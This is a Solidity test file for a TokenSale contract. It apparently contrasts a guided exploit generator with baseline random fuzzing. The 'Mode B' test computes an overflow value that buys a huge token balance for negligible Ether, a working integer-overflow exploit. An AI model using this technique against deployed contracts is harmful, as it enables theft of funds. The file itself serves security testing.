// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/TokenSale.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function prank(address who) external;
}

contract TokenSaleTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    TokenSale tokenSale;

    function setUp() public {
        tokenSale = new TokenSale();
    }

    // [Mode B: PRISM Guided Exploit Generator]
    // Calculates exact boundary wrap-around value to acquire tokens for negligible Ether
    function testGuidedExploit() public {
        unchecked {
            uint256 overflowAmount = (type(uint256).max / 1 ether) + 1;
            uint256 requiredValue = overflowAmount * 1 ether;
            vm.deal(address(this), requiredValue);
            tokenSale.buy{value: requiredValue}(overflowAmount);
            // Pricing Invariant Violation: Massive balance credited for negligible cost
            require(tokenSale.balanceOf(address(this)) == overflowAmount, "Price invariant violated by overflow");
        }
    }

    // [Mode A: Baseline Unconstrained Random Fuzzing]
    // Unconstrained random token purchase amounts across 256-bit integer space
    function testRandomFuzz(uint256 rawNumTokens) public {
        uint256 numTokens = rawNumTokens % 1000;
        if (numTokens == 0) return;
        uint256 cost = numTokens * 1 ether;
        vm.deal(address(this), cost);
        tokenSale.buy{value: cost}(numTokens);
        // Invariant: 1 ether paid per token purchased
        require(tokenSale.balanceOf(address(this)) == numTokens, "Price invariant holds under random inputs");
    }

    receive() external payable {}
}
